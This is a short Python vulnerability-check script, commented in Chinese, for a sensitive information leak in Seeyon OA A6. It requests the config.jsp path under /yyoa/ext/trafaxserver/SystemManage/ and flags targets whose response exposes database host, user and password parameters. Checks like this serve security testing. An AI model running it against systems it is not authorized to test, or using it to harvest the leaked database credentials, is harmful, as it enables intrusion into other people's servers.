#!/usr/bin/env python
# coding=utf-8
#致远OAA6config.jsp敏感信息泄漏漏洞

import requests, threading,base64
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        response = requests.get(url=url + '/yyoa/ext/trafaxserver/SystemManage/config.jsp',verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = str(bm) #设置网页编码
        if 'params:{"type":"db","host":host,"user":user,"pwd":pwd}' in response.text:
            print(colored('[+]致远OAA6config.jsp敏感信息泄漏漏洞', 'red'))
            results = f'{url}-->致远OAA6config.jsp敏感信息泄漏漏洞'
        else:
            print('[-]不存在致远OAA6config.jsp敏感信息泄漏漏洞')
    except:
        print('[-]不存在致远OAA6config.jsp敏感信息泄漏漏洞')


def zhiyuanOAconfig(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results